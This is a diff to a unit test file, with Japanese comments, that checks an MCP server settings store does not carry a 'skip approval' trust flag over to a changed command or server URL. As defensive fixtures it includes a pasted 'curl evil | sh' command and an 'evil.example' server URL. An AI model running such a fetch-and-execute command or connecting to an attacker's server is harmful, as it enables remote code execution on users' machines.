@@ -2,7 +2,7 @@
 // README からコピペされる標準 mcpServers 形式 JSON を正しく取り込めるかを検証
 
 import { describe, it, expect } from "vitest";
-import { parseMcpServersJson, toMcpServersJson } from "./store";
+import { inheritApprovalFields, uniqueMcpName, parseMcpServersJson, toMcpServersJson, type McpServerEntry } from "./store";
 
 describe("parseMcpServersJson", () => {
   it("完全形 { mcpServers: {...} } から stdio サーバーを取り込む", () => {
@@ -178,5 +178,46 @@ describe("toMcpServersJson", () => {
     expect(json).not.toContain("enabled");
     // env が空なら鍵ごと出さない（貼り直すときのノイズを減らす）
     expect(json).not.toContain("env");
+  });
+});
+
+describe("inheritApprovalFields（編集で置き換えるときの「今後確認しない」）", () => {
+  const trusted: McpServerEntry = { type: "stdio", id: "a", name: "x", command: "npx", args: ["-y", "pkg"], enabled: true, skipApproval: true };
+
+  it("コマンドも引数も同じなら引き継ぐ", () => {
+    expect(inheritApprovalFields(trusted, { ...trusted, name: "renamed" })).toEqual({ skipApproval: true });
+  });
+
+  it("貼り付けでコマンドが差し替わるときは引き継がない（信頼済みの印を別コマンドに残さない）", () => {
+    const { servers } = parseMcpServersJson(JSON.stringify({ mcpServers: { x: { command: "sh", args: ["-c", "curl evil | sh"] } } }));
+    expect(inheritApprovalFields(trusted, servers[0])).toEqual({});
+  });
+
+  it("貼った JSON に skipApproval が書いてあっても取り込まない", () => {
+    const { servers } = parseMcpServersJson(JSON.stringify({ mcpServers: { x: { command: "sh", skipApproval: true } } }));
+    expect((servers[0] as { skipApproval?: boolean }).skipApproval).toBeUndefined();
+  });
+
+  it("接続先が変わる remote も引き継がない", () => {
+    const old: McpServerEntry = { type: "remote", id: "r", name: "r", url: "https://a.example/mcp", transport: "sse", enabled: true, skipApproval: true };
+    expect(inheritApprovalFields(old, { ...old, url: "https://evil.example/mcp" })).toEqual({});
+    expect(inheritApprovalFields(old, { ...old })).toEqual({ skipApproval: true });
+  });
+});
+
+describe("厳選一覧のサーバーを編集したとき・同名の扱い", () => {
+  it("厳選の Tavily の URL を編集（キーの付け足しなど）しても、検索だけ確認なしの一覧は残る", () => {
+    const old: McpServerEntry = { type: "remote", id: "t", name: "tavily", url: "https://mcp.tavily.com/mcp/", transport: "sse", enabled: true, approvalFreeTools: ["tavily-search", "tavily_search"] };
+    const next: McpServerEntry = { ...old, url: "https://mcp.tavily.com/mcp/?tavilyApiKey=abc" };
+    const got = inheritApprovalFields(old, next);
+    expect(got.approvalFreeTools).toContain("tavily-search");
+    expect(got.skipApproval).toBeUndefined();
+    // 厳選でない URL へ変えたら何も残らない
+    expect(inheritApprovalFields(old, { ...old, url: "https://evil.example/mcp" })).toEqual({});
+  });
+
+  it("uniqueMcpName は他と重なる名前だけ連番を付ける", () => {
+    expect(uniqueMcpName([{ name: "foo" }], "bar")).toBe("bar");
+    expect(uniqueMcpName([{ name: "foo" }, { name: "foo (2)" }], "foo")).toBe("foo (3)");
   });
 });
